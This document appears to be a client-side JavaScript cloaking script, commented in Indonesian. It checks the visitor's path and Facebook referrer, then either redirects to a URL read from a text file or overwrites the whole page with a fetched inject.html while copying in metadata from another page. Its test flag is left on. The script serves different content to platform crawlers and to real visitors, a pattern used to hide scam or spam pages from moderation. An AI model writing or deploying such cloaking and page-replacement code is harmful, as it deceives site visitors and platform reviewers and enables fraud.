(function () {
  const referrer = document.referrer;
  const userAgent = navigator.userAgent;
  const isFacebookCrawler = /facebookexternalhit|facebook/i.test(userAgent);
  const currentPath = location.pathname;
  const testing = true; // Ubah ke false untuk mode produksi

  // Fungsi untuk membaca file eksternal
  const fetchFileContent = async (filePath) => {
    try {
      const response = await fetch(filePath, { cache: 'no-cache' });
      if (!response.ok) throw new Error(`Failed to fetch ${filePath}`);
      return response.text();
    } catch (error) {
      console.error(`Error fetching ${filePath}:`, error);
      alert('Gagal memuat konten halaman, silakan coba lagi.');
      return '';
    }
  };

  // Fungsi untuk menyisipkan metadata asli ke dalam DOM
  const injectMetadata = (metadata) => {
    const parser = new DOMParser();
    const doc = parser.parseFromString(metadata, 'text/html');

    const title = doc.querySelector('title');
    if (title) document.title = title.textContent;

    const head = document.head;
    doc.querySelectorAll('meta, link').forEach((meta) => {
      head.appendChild(meta.cloneNode(true));
    });
  };

  // Mendapatkan parameter ?ref=facebook dari URL
  const urlParams = new URLSearchParams(window.location.search);
  const refFromFacebook = urlParams.get('ref') === 'facebook';

  // Membaca URL dari google.txt, target.txt, metadata dari target.txt, dan daftar halaman dari landingpage.txt
  Promise.all([
    fetchFileContent('/google.txt'),
    fetchFileContent('/target.txt'),
    fetchFileContent('/target.txt'),
    fetchFileContent('/landingpage.txt'),
  ])
    .then(([googleUrl, targetUrl, originalHtml, landingPages]) => {
      const landingPageList = landingPages.split('\n').map((page) => page.trim());

      if (landingPageList.some((page) => currentPath.includes(page))) {
        injectMetadata(originalHtml);
        setTimeout(() => {
          // Tambahkan parameter ?ref=facebook jika referer dari Facebook
          const redirectUrl = `${googleUrl.trim()}?ref=facebook`;
          location.href = redirectUrl;
        }, 200);
      } else if (testing || refFromFacebook || referrer.includes('facebook.com')) {
        // Muat inject.html jika datang dari Facebook atau mode testing
        fetch('/inject.html', { cache: 'no-cache' })
          .then((response) => {
            if (!response.ok) throw new Error('Failed to load inject.html');
            return response.text();
          })
          .then((html) => {
            setTimeout(() => {
              document.documentElement.innerHTML = html;
              injectMetadata(originalHtml);
            }, 200);
          })
          .catch((err) => {
            console.error('Error loading inject.html:', err);
            alert('Gagal memuat halaman. Silakan coba lagi.');
          });
      }
    })
    .catch((err) => console.error('Error loading URLs:', err));
})();